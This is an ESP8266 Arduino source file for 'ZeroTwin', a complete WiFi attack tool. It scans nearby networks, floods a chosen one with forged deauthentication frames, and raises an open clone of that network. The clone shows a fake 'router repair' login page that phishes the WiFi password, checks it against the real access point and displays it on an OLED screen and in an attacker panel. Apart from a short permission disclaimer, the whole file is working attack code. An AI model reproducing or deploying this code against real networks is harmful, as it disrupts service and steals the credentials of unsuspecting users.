#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Fonts/Picopixel.h>
#include <Fonts/FreeMono9pt7b.h>

/* AP SSID & Password */
const char AP_SSID[] = "ZeroTwin v1.0";
const char AP_PASS[] = "zero8888";

/* OLED Configuration */
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

const unsigned char zeroTwinBoot [] PROGMEM = {
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
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	0x00, 0x00, 0x00, 0x03, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

const unsigned char zeroTwinIcon [] PROGMEM = {
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0xff, 0xff, 0xf8, 0x00, 0x1f, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
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	0xff, 0x00, 0x00, 0x03, 0xe0, 0x00, 0x00, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Text variables in login page
#define SUBTITLE "Error - There is a problem with the wifi but the system will fix it automatically"
#define TITLE "Login"
#define BODY "Enter the wifi password to continue the system repair."
#define POST_TITLE "Repairing router system..."
#define POST_BODY "Please wait..."

extern "C" {
#include "user_interface.h"
}

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  uint8_t rssi;
}  _Network;


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

String _correct = "";
String _tryPassword = "";


String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #1e31b5; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #dc214c; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>"+a+" :: "+t+"</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>"+CSS+"</style></head>"
    "<body><nav><b>"+a+"</b> "+SUBTITLE+"</nav><div><h1>"+t+"</h1></div><div>";
  return h; }

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' >" +
    "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Login\"></form></center>" + footer();
}

String posted() {
  return header(POST_TITLE) + POST_BODY + "<script> setTimeout(function(){window.location.href = '/result';}, 15000); </script>" + footer();
}

String footer() { 
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

void setup() {
  Serial.begin(115200);

  /* OLED Conf 
  If OLED not responding, change 0x3C to 0x3D.
  */

   if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { 
    Serial.println(F("SSD1306 allocation failed"));
    for(;;); 
  }

  delay(2000);
  display.setTextSize(1);             
  display.setTextColor(WHITE);  
  display.clearDisplay();
  display.drawBitmap(0, 0, zeroTwinBoot, 128, 64, WHITE); 
  display.setCursor(65, 20);  display.println("./ZeroTwin");
  display.setCursor(68, 30);  display.println("> v1.0");
  display.display();
  delay(5000);
  display.clearDisplay();
  display.setFont(&Picopixel);
  display.setTextSize(1);             
  display.setTextColor(WHITE);        
  display.setCursor(0, 10);  display.println("[*] Starting ZeroTwin 1.0 git/shinyxn");
  delay(2000);
  display.display();

  display.setCursor(0, 17);  display.println("[*] Configuring ESP8266 AP-STA Mode");
  delay(2000);
  display.display();
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_SSID, AP_PASS);
  display.setCursor(0, 24);  display.print("[+] AP SSID > "); display.println(AP_SSID);
  delay(2000);
  display.display();
  display.setCursor(0,31);  display.print("[+] AP PASSWORD > ");  display.println(AP_PASS);
  delay(2000);
  display.display();
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  display.setCursor(0, 38);  display.println("[*] Starting Webserver at 192.168.4.1");
  delay(2000);
  display.display();
  

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.onNotFound(handleIndex);
  webServer.begin();
  display.setCursor(0,45);  display.println("[*] Successfully started ZeroTwin 1.0");
  delay(2000);
  display.display();
  display.setCursor(0, 52);  display.println(">> I think you know what you're doing");
  delay(5000);
  display.display();
  display.setCursor(0,59);  display.println(">> Good Luck, senpai >_< <<");
  delay(2000);
  display.display();
}
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      network.rssi = WiFi.RSSI(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
          
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
   }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>You entered wrong password</h2><p>Try again...</p></body> </html>");

        display.setCursor(0, 38);  
        display.println("[-] User entered wrong password!");
        delay(2000);
        display.display();
       
    Serial.println("User entered wrong password");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>System repair has been completed!</h2></body> </html>");
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP(AP_SSID, AP_PASS);
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Password for " + _selectedNetwork.ssid + "<br> Result: " + _tryPassword;

        display.setCursor(0, 38);  
        display.println("[+] Yabai senpai! Password is true");
        delay(2000);
        display.display();
        display.setCursor(0, 45);  
        display.println("[*] > Connect to AP for result");
        delay(1000);
        display.display();
        deauthing_active = false;
        display.setCursor(0, 52);  
        display.println("[*] Stopping deauth & EvilTwin");
        delay(1000);
        display.display();
        display.setCursor(0, 59);  
        display.println("[*] ./ZeroTwin (github.com/shinyxn)");
        delay(1000);
        display.display();

    Serial.println("Yabai! Password is true");
    Serial.println(_correct);
  }
}

char _tempHTML[] PROGMEM = R"=====(
<html>
    <head>
        <meta name='viewport' content='initial-scale=1.0, width=device-width'>
        <title>ZeroTwin</title>
        <style>
            body {
                background: #1a1a1a;
                color: #bfbfbf;
                font-family: sans-serif;
                margin: 0;
            }
            .content {max-width: 800px;margin: auto;}
            table {border-collapse: collapse;}
            th, td {
                padding: 10px 6px;
                text-align: left;
                border-style:solid;
                border-color: rgb(204, 12, 207);
            }
            button {
                display: inline-block;
                height: 38px;
                padding: 0 20px;
                color:#fff;
                text-align: center;
                font-size: 11px;
                font-weight: 600;
                line-height: 38px;
                letter-spacing: .1rem;
                text-transform: uppercase;
                text-decoration: none;
                white-space: nowrap;
                background: #2f3136;
                border-radius: 4px;
                border: none;
                cursor: pointer;
                box-sizing: border-box;
            }
            button:hover {
                background: #42444a;
            }
            h1 {
                font-size: 1.7rem;
                margin-top: 1rem;
                background: #2f3136;
                color: #bfbfbb;
                padding: 0.2em 1em;
                border-radius: 3px;
                border-left: solid #d1114d 5px;
                font-weight: 100;
            }
        </style>
    </head>
    <body>
        <div class='content'>
        <p>
            <h1 style="border: solid #bd0b61 3px; padding: 0.2em 0.2em; text-align: center; font-size: 2.5rem;">Zer0Twin v1.0</h1>
            <span style="color: #F04747;">WARNING: </span><br>
            <span>
                - With great power comes great responsibility<br>
                - This tool is for testing and educational purposes<br>
                - Please use this tool for pen-testing purposes on your own network or a network that you have permission for<br>
                - <b>I don't take any responsibility for what you do with this program in the future</b><br>
                </span>
        </p><hr><br>
        <h1>Att4ck</h1>
        <div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>
        <button style='display:inline-block;'{disabled}>{deauth_button}</button></form>
        <form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>
        <button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>
        </div><br><hr><br>
        <h1>P4nel</h1>
        <table>
        <tr><th>SSID</th><th>RSSI</th><th>BSSID</th><th>CHANNEL</th><th>OPTION</th></tr>
              
)=====";

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];

        /* OLED */
          display.clearDisplay();
          display.drawBitmap(0, 0, zeroTwinIcon, 128, 64, WHITE); 
          delay(5000);
          display.display(); 
          display.setCursor(65, 14);  display.println("[*] Choose target");
          delay(2000);
          display.display();
          display.setCursor(65, 21);  display.print("> ");  display.println(_selectedNetwork.ssid.c_str());
          delay(2000);
          display.display();
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
      
      /* OLED */
          display.setCursor(65, 28);  display.println("[*] Start deauth");
          delay(2000);
          display.display();
          display.setCursor(65, 35);  display.println("[+] Sending packet");
          delay(2000);
          display.display();
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
          /* OLED */
        display.setCursor(65, 42);  display.println("[*] Start EvilTwin");
        delay(2000);
        display.display();
        display.setCursor(65, 49);  display.println("[*] Initializing...");
        delay(2000);
        display.display();

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
          /* OLED */
          display.clearDisplay();
          display.setCursor(0, 10);  
          display.println("[*] Stopped AP Mode");
          delay(2000);
          display.display();

      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
            /* OLED */
          display.setCursor(0, 17);  
          display.println("[+] Creating cl0ne n3tw0rk");
          delay(2000);
          display.display();
      WiFi.softAP(_selectedNetwork.ssid.c_str());
            /* OLED */
          display.setCursor(0, 24);  
          display.print("[+] Created > "); display.println(_selectedNetwork.ssid.c_str());
          delay(2000);
          display.display();
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
            /* OLED */
          display.setCursor(0, 31);  
          display.println("[*] Starting webserver at 192.168.4.1");
          delay(2000);
          display.display();
          display.setCursor(0, 38);  
          display.println("[*] Waiting client to c0nn3ct");
          delay(2000);
          display.display();

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(AP_SSID, AP_PASS);
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
        _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + _networks[i].rssi + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #20c20e; color:black;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop Deauth");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start Deauth");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop Evil-Twin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start Evil-Twin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table><br><hr><br>";

    if (_correct != "") {
      _html += "<h1>R3sult</h1></br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();

        display.setCursor(0, 45);  
        display.println("[*] An user opening login page");
        delay(300);
        display.display();
        display.setCursor(0, 52);  
        display.println("[*] Start listening...");
        delay(300);
        display.display();
    
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", posted());

          display.clearDisplay();
          display.setCursor(0, 10);  
          display.println("[*] Listening at 192.168.4.1");
          delay(1000);
          display.display();
          display.setCursor(0, 17);  
          display.println("[*] An user input a password");
          delay(500);
          display.display();
          display.setCursor(0, 24);  
          display.print("[*] > ");  display.println(webServer.arg("password").c_str());
          delay(500);
          display.display();
          display.setCursor(0, 31);  
          display.println("[*] Trying the p4ssword to c0nn3ct");
          delay(1000);
          display.display();
    } else {
      webServer.send(200, "text/html", index());
    }
  }

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x00, 0x00, 0x01, 0x00};
    
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("Bad");
    } else {
      Serial.println("Good");
    }
    wifinow = millis();
  }
}
